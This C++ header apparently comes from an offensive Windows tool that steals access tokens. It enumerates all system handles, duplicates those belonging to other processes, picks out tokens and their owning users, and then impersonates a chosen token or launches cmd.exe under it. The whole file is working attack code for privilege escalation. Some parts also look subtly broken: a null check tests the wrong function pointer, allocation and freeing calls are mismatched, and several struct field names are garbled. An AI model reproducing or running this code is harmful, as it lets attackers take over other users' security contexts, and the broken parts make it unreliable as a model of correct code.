#pragma once
#include <Windows.h>
#include <winternl.h>
#include <lm.h>
#include <heapapi.h>
#include <handleapi.h>
#include <OleDlg.h>
#include <securitybaseapi.h>
#include <tlhelp32.h>

#include "syscalls.h"
#include <exception>

// -----------------------------------------------------------------------------------------------------------------
// A lot of this code is stolen from https://github.com/sensepost/impersonate
// ------------------------------------------------------------------------------------------------------------------

#define STATUS_SUCCESS               ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW       ((NTSTATUS)0x80000005L)

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT ProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}  SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG Inis_token_validAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG is_token_validAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

typedef UNICODE_STRING OBJECT_NAME_INFORMATION;
typedef UNICODE_STRING* POBJECT_NAME_INFORMATION;

// Wrapper for a Token

typedef struct _Token {
    HANDLE tokenHandle;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO tokenHandleInfo;
    wchar_t* tokenUsername;
    TOKEN_TYPE tokenType;
} Token;

// ------------------------------------------------------------------------------------------------------------------

void run_cmd_with_token(Token* tokenToUse)
{
    // Duplicate the token
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
    HANDLE pNewToken;
    if (!DuplicateTokenEx(tokenToUse->tokenHandle, TOKEN_ALL_ACCESS, NULL, seImpersonateLevel, tokenToUse->tokenType, &pNewToken))
    {
        DWORD LastError = GetLastError();
        wprintf(L"[!] ERROR: Could not duplicate token: %d\n", LastError);
        return;
    }

    if (tokenToUse->tokenType == TokenImpersonation)
    {
        printf("[*] ImpersonationToken chosen -> elevating current process to %ws\n", tokenToUse->tokenUsername);
        
        /*if (!SetThreadToken(NULL, pNewToken))
        {
            printf("[!] ERROR: Could not set thread token: %d\n", GetLastError());
        }
        */
        if (!ImpersonateLoggedOnUser(pNewToken))
        {
            printf("[!] ERROR: Impersonation failed: %d\n", GetLastError());
        }
    }   
    else if (tokenToUse->tokenType == TokenPrimary)
    {
        printf("[*] PrimaryToken chosen -> starting cmd.exe as %ws\n", tokenToUse->tokenUsername);
        STARTUPINFO si = {};
        PROCESS_INFORMATION pi = {};
        if (!CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        {
            printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
        }
    }
    CloseHandle(pNewToken);
}

LPWSTR get_object_info(HMODULE hNtdll, HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass)
{
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation)
    {
        printf("[!] Error resolving NtQuerySystemInformation syscall");
        return 0;
    }
    NtQueryObject_t NtQueryObject = (NtQueryObject_t)GetProcAddress(hNtdll, "NtQueryObject");
    if (!NtQuerySystemInformation)
    {
        printf("[!] Error resolving NtQueryObject syscall");
        return 0;
    }

    LPWSTR data = NULL;
    DWORD dwSize = sizeof(OBJECT_NAME_INFORMATION);
    POBJECT_NAME_INFORMATION pObjectInfo = (POBJECT_NAME_INFORMATION)malloc(dwSize);

    NTSTATUS ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    if ((ntReturn == STATUS_BUFFER_OVERFLOW) || (ntReturn == STATUS_INFO_LENGTH_MISMATCH)) 
    {
        pObjectInfo = (POBJECT_NAME_INFORMATION)realloc(pObjectInfo, dwSize);
        ntReturn = NtQueryObject(hObject, objInfoClass, pObjectInfo, dwSize, &dwSize);
    }
    if ((ntReturn >= STATUS_SUCCESS) && (pObjectInfo->Buffer != NULL)) 
    {
        data = (LPWSTR)calloc(pObjectInfo->Length, sizeof(WCHAR));
        CopyMemory(data, pObjectInfo->Buffer, pObjectInfo->Length);
    }
    free(pObjectInfo);
    return data;
}

void get_token_information(Token* tokenInfo) 
{
    // Token Type
    DWORD returned_tokinfo_length;
    if (!GetTokenInformation(tokenInfo->tokenHandle, TokenStatistics, NULL, 0, &returned_tokinfo_length)) 
    {
        PTOKEN_STATISTICS TokenStatisticsInformation = (PTOKEN_STATISTICS)GlobalAlloc(GPTR, returned_tokinfo_length);
        if (GetTokenInformation(tokenInfo->tokenHandle, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length)) 
        {
            if (TokenStatisticsInformation->TokenType == TokenPrimary) 
            {
                tokenInfo->tokenType = TokenPrimary;
            }
            else if (TokenStatisticsInformation->TokenType == TokenImpersonation) 
            {
                tokenInfo->tokenType = TokenImpersonation;
            }
        }
    }

    // User Info
    wchar_t username[256], domain[256];
    wchar_t* full_name = new wchar_t[256]; // TODO: memory leak - clean up when token is destroyed

    DWORD user_length = sizeof(username);
    DWORD domain_length = sizeof(domain);
    DWORD token_info;
    SID_NAME_USE sid;

    tokenInfo->tokenUsername = (wchar_t*)L"./UNKNOWN";
    if (!GetTokenInformation(tokenInfo->tokenHandle, TokenUser, NULL, 0, &token_info))
    {
        PTOKEN_USER TokenStatisticsInformation = (PTOKEN_USER)GlobalAlloc(GPTR, token_info);
        if (GetTokenInformation(tokenInfo->tokenHandle, TokenUser, TokenStatisticsInformation, token_info, &token_info))
        {
            // Query username and domain to token user SID
            LookupAccountSidW(NULL, ((TOKEN_USER*)TokenStatisticsInformation)->User.Sid, username, &user_length, domain, &domain_length, &sid);
            swprintf_s(full_name, 256, L"%ws/%ws", domain, username);
            tokenInfo->tokenUsername = full_name;
        }
    }
}

void list_available_tokens(HMODULE hNtdll, Token** foundTokens)
{
    int nFoundTokens = 0;
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        printf("[!] Error resolving NtQuerySystemInformation syscall");
    }

    ULONG systemHandleInformationClass = 0x10; // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle.htm
    ULONG systemHandleInformationSize = 1024 * 1024 * 10;
    ULONG returnLength = 0;
    SYSTEM_HANDLE_INFORMATION* handleTableInformation = (SYSTEM_HANDLE_INFORMATION*)HeapAlloc(GetProcessHeap(), 0, systemHandleInformationSize);

    // Get all handles available & iterate over handles
    NtQuerySystemInformation(systemHandleInformationClass, handleTableInformation, systemHandleInformationSize, &returnLength);
    HANDLE processSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    for (DWORD i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

        HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.ProcessId);
        if (process == INVALID_HANDLE_VALUE)
        {
            CloseHandle(process);
            continue;
        }

        HANDLE dupHandle;
        if (DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) == 0)
        {
            CloseHandle(process);
            continue;
        }

        // Check if handle is a Token
        LPWSTR objType = get_object_info(hNtdll, dupHandle, ObjectTypeInformation);
        if (wcscmp(objType, L"Token")) {
            CloseHandle(process);
            CloseHandle(dupHandle);
            delete[] objType;
            continue;
        }
        delete[] objType;

        Token* currToken = new Token;
        currToken->tokenHandle = dupHandle;
        currToken->tokenHandleInfo = handleInfo;
        get_token_information(currToken);

        BOOL tokenAlreadyEnumerated = FALSE;
        for (int j = 0; j < nFoundTokens; ++j)
        {
            Token* t = foundTokens[j];
            if ((t->tokenType == currToken->tokenType)
                && (wcscmp(t->tokenUsername, currToken->tokenUsername) == 0)
                && t->tokenHandleInfo.ProcessId == currToken->tokenHandleInfo.ProcessId) // TODO: revisit when adding more attrs to token type
            {
                // Token with same attributes exists
                tokenAlreadyEnumerated = TRUE;
            }
        }

        if (tokenAlreadyEnumerated)
        {
            CloseHandle(process);
            CloseHandle(dupHandle);
            continue;
        }

        foundTokens[nFoundTokens] = currToken;
        nFoundTokens++;
        const wchar_t* wTokenType = currToken->tokenType == TokenImpersonation ? L"ImpersonationToken" : L"PrimaryToken";

        // resolve PID to name
        wchar_t* processName = (wchar_t*)L"Unknown";
        if (processSnapshotHandle)
        {
            PROCESSENTRY32 process;
            process.dwSize = sizeof(PROCESSENTRY32);
            Process32First(processSnapshotHandle, &process);
            do
            {
                if (process.th32ProcessID == (DWORD)currToken->tokenHandleInfo.ProcessId)
                {
                    processName = process.szExeFile;
                    break;
                }
            } while (Process32Next(processSnapshotHandle, &process));
        }

        printf("[*] %i: [%ws]::[%ws(%i)]::[%ws]\n", nFoundTokens - 1, wTokenType, processName, currToken->tokenHandleInfo.ProcessId, currToken->tokenUsername);
            
        CloseHandle(process);
    }

    CloseHandle(processSnapshotHandle);
    HeapFree(GetProcessHeap(), 0, handleTableInformation);
}